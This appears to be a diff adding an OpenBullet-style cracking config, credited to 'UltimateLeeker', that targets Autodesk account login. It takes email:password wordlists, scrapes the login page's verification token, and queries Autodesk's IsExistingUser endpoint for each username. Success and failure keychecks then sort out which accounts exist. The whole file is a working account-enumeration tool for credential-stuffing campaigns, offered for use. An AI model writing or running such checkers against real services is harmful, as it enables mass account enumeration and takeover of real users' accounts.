@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "autodesk",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T16:17:34.0221397+07:00",
+  "AdditionalInfo": "",
+  "Author": "Dvildo /aka UltimateLeeker",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://accounts.autodesk.com/Authentication/LogOn#username" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "value=\"" "\" />" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://accounts.autodesk.com/Authentication/IsExistingUser" AutoRedirect=TRUE 
+  CONTENT "__RequestVerificationToken=<TOKEN>&UserName=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<div class=\"col-xs-12 password\">" 
+    KEY "{\"UserExists\":true,\"" 
+  KEYCHAIN Failure OR 
+    KEY "<div class=\"signinErrorPopup text-left halfSecTrans green-link populateEmail\" style=\"display: block; opacity: 1;\">" 
+    KEY "{\"UserExists\":false,\"" 
